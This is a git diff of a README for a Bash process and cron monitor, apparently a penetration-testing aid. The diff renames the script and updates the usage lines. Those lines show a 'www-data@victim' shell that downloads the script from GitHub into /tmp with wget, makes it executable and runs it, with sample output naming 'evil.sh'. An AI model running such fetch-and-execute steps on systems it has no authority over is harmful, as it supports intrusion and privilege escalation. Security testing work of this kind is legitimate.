@@ -4,9 +4,9 @@ Bash script to monitor new processes and cron tasks that run at regular interval
 
 ```bash
 www-data@victim:~$ cd /tmp
-www-data@victim:~$ wget https://raw.githubusercontent.com/d4t4s3c/Linux-Monitor-New-Process/main/lmnp.sh
-www-data@victim:~$ chmod +x lmnp.sh
-www-data@victim:~$ ./lmnp.sh
+www-data@victim:~$ wget https://raw.githubusercontent.com/d4t4s3c/PSmon/main/PSmon.sh
+www-data@victim:~$ chmod +x PSmon.sh
+www-data@victim:~$ ./PSmon.sh
 
 successful results:
 /bin/bash /directory/evil.sh
